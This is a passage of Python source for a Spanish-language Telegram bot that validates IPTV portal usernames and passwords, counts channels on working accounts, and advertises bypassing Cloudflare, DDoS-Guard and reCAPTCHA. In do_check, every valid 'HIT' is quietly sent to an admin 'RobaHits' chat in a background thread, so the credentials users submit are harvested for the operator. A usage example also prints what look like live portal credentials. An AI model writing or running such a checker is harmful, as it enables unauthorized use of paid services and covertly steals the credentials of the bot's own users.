    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

# ══════════════════════════════════════════════════════
#  🔄 KEEP-ALIVE 24/7
# ══════════════════════════════════════════════════════

def keep_alive():
    if not RENDER_URL:
        return
    while True:
        try:
            requests.get(RENDER_URL, timeout=8)
        except Exception:
            pass
        time.sleep(480)

# ══════════════════════════════════════════════════════
#  🛠️ HELPERS
# ══════════════════════════════════════════════════════

def is_admin(u: Update) -> bool:
    return u.effective_user.id == ADMIN_ID

def tg_name(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)

# ══════════════════════════════════════════════════════
#  ⚡ LÓGICA CENTRAL
# ══════════════════════════════════════════════════════

async def do_check(update: Update, portal: str, user: str, pwd: str, is_xui: bool = False):
    if not bot_active:
        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return

    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    tg_user = tg_name(update)

    msg  = await update.message.reply_text("🔍 Verificando…")
    loop = asyncio.get_event_loop()

    status, result = await loop.run_in_executor(
        _EXECUTOR, verify_account, portal, user, pwd, is_xui)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text("📡 Obteniendo contenido…")
        ui = result["user_info"]
        # Paralelo: conteo de contenido + categorías + ubicación
        live_f = loop.run_in_executor(_EXECUTOR, get_content_counts, portal, user, pwd)
        cats_f = loop.run_in_executor(_EXECUTOR, get_categories, portal, user, pwd)
        live, vod, series = await live_f
        cats              = await cats_f
        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        threading.Thread(
            target=send_robahit,
            args=(portal, user, pwd, ui, live, vod, series, tg_user),
            daemon=True
        ).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(card_custom(portal, user, pwd, ui, tg_user),
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, user, tg_user), parse_mode=ParseMode.HTML)

    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, user, tg_user), parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════
#  📟 COMANDOS
# ══════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATS["users"].add(update.effective_user.id)
    if is_admin(update):
        global bot_active
        bot_active = True
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📖 Ayuda",  callback_data="help"),
        InlineKeyboardButton("📊 Estado", callback_data="status"),
    ]])
    await update.message.reply_text(
        f"🦂 <b>IPTV BOT ULTRA PRO</b> 🦂\n"
        f"         <b>BY LUIS R</b>\n\n"
        f"✅ Bot activo — verificación en ~5s\n\n"
        f"📌 <b>Pega tu URL aquí (cualquier formato):</b>\n"
        f"<code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
        f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n"
        f"<code>portal|usuario|pass</code>\n\n"
        f"⚡ Paralelo — max 25s por cuenta\n"
        f"🛡️ Bypass CF/DDoS-Guard/reCAPTCHA\n"
        f"📡 Soporte XUI One + Xtream + M3U\n"
        f"🔔 HITs al admin automático\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        f"🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivar.\n🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
    try:
        import cloudscraper
        cf_st = "✅ Instalado"
    except ImportError:
        cf_st = "⚠️ No instalado (pip install cloudscraper)"
    await update.message.reply_text(
        f"🦂 <b>ESTADO — LUIS R</b> 🦂\n\n"
        f"📺 Bot: {estado}\n"
        f"⏰ Uptime: {h:02d}h {m:02d}m {s:02d}s\n"
        f"🕐 Hora: {now_str()}\n"
        f"🌐 Zona: {TZ_NAME}\n\n"
        f"✅ Hits: {STATS['hits']}\n"
        f"❌ Fails: {STATS['fails']}\n"
        f"🔄 Retries: {STATS['retries']}\n"
        f"⭐ Total: {STATS['checks']}\n"
        f"👥 Usuarios: {len(STATS['users'])}\n\n"
        f"🛡️ Cloudscraper: {cf_st}\n"
        f"🔔 RobaHits → <code>{ROBAHITS_CHATID}</code>\n"
        f"📋 Dominios CF: {len(CF_DOMAINS)}\n"
        f"🤖 Threads activos: {threading.active_count()}\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <b>Uso:</b>\n"
            "<code>/check portal:puerto usuario contraseña</code>\n\n"
            "🔥 <b>Ejemplo:</b>\n"
            "<code>/check etvhosts.site:55337 DefJXWm41 Vfi68Yqa57</code>",
            parse_mode=ParseMode.HTML)
        return
    await do_check(update, args[0], args[1], args[2])

async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <code>/debug portal:puerto usuario contraseña</code>",
            parse_mode=ParseMode.HTML)
        return
    portal, user, pwd = args[0], args[1], args[2]
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080
    msg  = await update.message.reply_text("🔬 Diagnóstico…")
    primary, alt = _schemes_for_portal(portal)
    lines = [
        f"🔬 <b>DIAGNÓSTICO</b> <code>{portal}</code>\n",
        f"🛡️ CF: {'✅ Sí' if _is_cf(host) else '❌ No'}",
        f"🔌 Protocolo detectado: {primary.upper()} (alt: {alt.upper()})",
    ]
    # TCP
    for p in (port, 80, 443):
        try:
            conn = socket.create_connection((host, p), timeout=3)
            conn.close()
            lines.append(f"🔌 TCP ✅ puerto {p}")
            break
        except Exception as e:
            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:40]}")
    lines.append("")
    # HTTP tests
    for scheme in (primary, alt):
        for ep in ("player_api.php", "get.php"):
            if ep == "player_api.php":
                url = f"{scheme}://{portal}/{ep}?username={user}&password={pwd}"
            else:
                url = f"{scheme}://{portal}/{ep}?username={user}&password={pwd}&type=m3u_plus"
            lines.append(f"🔗 <code>{scheme.upper()} {ep}</code>")
            try:
                r = requests.get(url, headers={"User-Agent": ALL_USER_AGENTS[0]},
                                 timeout=(4, 10), verify=False)
                raw = r.text.strip()[:300].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                lines.append(f"  HTTP {r.status_code} | CT: {r.headers.get('Content-Type','?')[:30]}")
                lines.append(f"  <code>{raw}</code>")
            except requests.exceptions.Timeout:
                lines.append("  ⏱ Timeout")
            except Exception as e:
                lines.append(f"  ❌ {str(e)[:60]}")
            lines.append("")
    # XUI One test
    xui_url = f"{primary}://{portal}/playlist/{user}/{pwd}/m3u_plus"
    lines.append(f"🔗 <code>XUI One playlist</code>")
    try:
        r = requests.get(xui_url, headers={"User-Agent": ALL_USER_AGENTS[0]},
                         timeout=(4, 10), verify=False)
        raw = r.text.strip()[:200].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
        lines.append(f"  HTTP {r.status_code}")
        lines.append(f"  <code>{raw}</code>")
    except Exception as e:
        lines.append(f"  ❌ {str(e)[:60]}")

    text = "\n".join(lines)
    # Telegram límite 4096 chars
    if len(text) > 4000:
        text = text[:4000] + "\n…(truncado)"
    await msg.edit_text(text, parse_mode=ParseMode.HTML)

async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    args = context.args
    if not args:
        domains = "\n".join(f"• {d}" for d in CF_DOMAINS)
        await update.message.reply_text(
            f"📋 <b>Dominios CF ({len(CF_DOMAINS)}):</b>\n{domains}\n\n"
            f"📌 Agregar: <code>/addcf dominio.com</code>",
            parse_mode=ParseMode.HTML)
        return
    domain = args[0].lower().strip()
    if domain not in CF_DOMAINS:
        CF_DOMAINS.append(domain)
        await update.message.reply_text(
            f"✅ <code>{domain}</code> agregado.\n🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"⚠️ <code>{domain}</code> ya estaba.", parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_cmds = ""
    if is_admin(update):
        admin_cmds = (
            "\n\n🔧 <b>Admin:</b>\n"
            "/stop — 🔴 Apagar\n"
            "/status — 📊 Estadísticas\n"
            "/debug <code>portal user pass</code> — 🔬 Diagnóstico\n"
            "/addcf <code>dominio</code> — 🛡️ Agregar CF\n"
        )
    await update.message.reply_text(
        f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
        f"📌 <b>Comandos:</b>\n"
        f"/start — 🟢 Inicio\n"
        f"/check <code>portal user pass</code> — ✅ Verificar\n"
        f"/help — ❓ Ayuda\n"
        f"{admin_cmds}\n"
        f"💡 <b>Formatos soportados:</b>\n"
        f"• <code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
        f"• <code>http://portal/playlist/user/pass/m3u_plus</code> ← XUI One\n"
        f"• <code>portal|usuario|pass</code>\n"
        f"• <code>portal usuario pass</code>\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "help":
        await query.message.reply_text(
            f"💡 Pega tu URL directamente o usa:\n"
            f"/check <code>portal:puerto user pass</code>\n\n"
            f"Formatos:\n"
            f"• <code>http://portal/get.php?username=U&amp;password=P</code>\n"
            f"• <code>http://portal/playlist/user/pass/m3u_plus</code>\n"
            f"• <code>portal|user|pass</code>\n\n"
            f"🦂 {BOT_USERNAME}", parse_mode=ParseMode.HTML)
    elif query.data == "status":
        estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
        await query.message.reply_text(
            f"📊 {estado} | ⭐ {STATS['checks']} | ✅ {STATS['hits']} | 👥 {len(STATS['users'])}\n"
            f"🕐 {now_str()}\n🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active:
        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return
    text = (update.message.text or "").strip()
    portal, user, pwd, is_xui = extract_from_url(text)
    if portal and user and pwd:
        await do_check(update, portal, user, pwd, is_xui=is_xui)
    else:
        await update.message.reply_text(
            f"❓ Formato no reconocido.\n\n"
            f"📌 Ejemplos válidos:\n"
            f"<code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
            f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n"
            f"<code>portal|usuario|pass</code>\n\n"
            f"Usa /help para más info.\n🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════
#  🚀 MAIN — Loop robusto 24/7
# ══════════════════════════════════════════════════════

def main():
    if not BOT_TOKEN:
        log.error("❌ BOT_TOKEN no configurado. Railway → Variables → BOT_TOKEN")
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info(f"🦂 IPTV BOT ULTRA PRO v3.0 — LUIS R | TZ: {TZ_NAME}")
    log.info(f"   UAs: {len(ALL_USER_AGENTS)} | CF dominios: {len(CF_DOMAINS)} | Threads: 20")
    log.info(f"   Timeouts: TCP={TCP_TIMEOUT}s CONN={CONN_TIMEOUT}s READ={READ_TIMEOUT}s TOTAL={TOTAL_TIMEOUT}s")

    RETRY_DELAYS = [5, 10, 15, 30, 60]
    attempt = 0

    while True:
        try:
            app = (
                Application.builder()
                .token(BOT_TOKEN)
                .concurrent_updates(True)   # permite verificar múltiples cuentas a la vez
                .build()
            )
            app.add_handler(CommandHandler("start",  cmd_start))
            app.add_handler(CommandHandler("stop",   cmd_stop))
            app.add_handler(CommandHandler("status", cmd_status))
            app.add_handler(CommandHandler("check",  cmd_check))
            app.add_handler(CommandHandler("debug",  cmd_debug))
            app.add_handler(CommandHandler("addcf",  cmd_addcf))
            app.add_handler(CommandHandler("help",   cmd_help))
            app.add_handler(CallbackQueryHandler(callback_handler))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

            log.info("✅ Bot listo.")
            app.run_polling(drop_pending_updates=True)

            attempt = 0
            time.sleep(2)

        except requests.exceptions.ReadTimeout:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.warning(f"[polling] ReadTimeout → reconectando en {delay}s")
            time.sleep(delay); attempt += 1

        except requests.exceptions.ConnectionError as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.warning(f"[polling] ConnectionError: {e} → reconectando en {delay}s")
            time.sleep(delay); attempt += 1

        except Exception as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.error(f"[polling] {e}\n{traceback.format_exc()}")
            time.sleep(delay); attempt += 1

if __name__ == "__main__":
    main()

